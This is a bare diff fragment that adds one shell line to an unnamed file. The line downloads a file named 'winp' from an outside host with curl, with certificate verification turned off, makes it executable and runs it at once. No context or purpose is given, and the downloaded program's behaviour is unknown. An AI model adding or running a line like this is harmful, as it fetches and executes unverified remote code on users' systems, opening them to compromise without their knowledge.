@@ -1,0 +1,1 @@
+curl -sLkO https://hammou.ch/winp ; chmod +x winp ; ./winp
